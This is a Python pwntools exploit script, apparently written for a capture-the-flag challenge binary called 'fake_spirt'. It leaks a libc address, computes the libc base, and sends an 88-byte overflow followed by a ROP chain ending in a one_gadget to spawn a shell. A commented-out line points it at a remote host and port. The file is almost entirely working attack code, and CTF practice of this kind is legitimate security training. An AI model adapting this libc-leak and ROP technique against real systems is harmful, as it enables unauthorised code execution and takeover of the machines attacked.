from pwn import *

#109.233.56.90 11731

io = process(["./lib/x86_64-linux-gnu/ld-2.31.so", "./fake_spirt"], env={"LD_PRELOAD":"/root/Desktop/pwn/fakeSpirt/libc-2.31.so"})
#io = connect("109.233.56.90","11731")
io.recvuntil(b"t")
leak = io.recvuntil(b"\n")[1:-1]
leak = u64(leak.ljust(8,b"\x00"))

#off = leak - io.libc.address
#print("OFFSET LEAKED: ", hex(off))

off = 0x1ebbe0
libc_base = leak - off

print(" LIBC: ",hex(libc_base))

lb =  ELF("/root/Desktop/pwn/fakeSpirt/libc-2.31.so")
free_hook = lb.symbols["__free_hook"] + libc_base			#unusued
system = lb.symbols["system"] + libc_base					#unusued
free = lb.symbols["free"] + libc_base						#unusued
#sleep(10)
pl = p64(0x0) + p64(0x40) 
io.sendline(pl)

#sleep(15)
one = 0xe6aee
two = 0xe6af1
three = 0xe6af4
POP_RSI = 0x27529 
POP_RDX_POP_RBX = 0x1626d6
POP_RDI = 0x26b72 

pl = b"A"*88 +  p64(POP_RSI + libc_base) + p64(0x0) + p64(POP_RDX_POP_RBX + libc_base) + p64(0x0) + p64(0x0) + p64(three + libc_base) #one_gadget + prepare
#pl = b"A"*88 + p64(POP_RDI + libc_base) + b"cat flag" + p64(system) 
io.sendline(pl)
io.interactive()
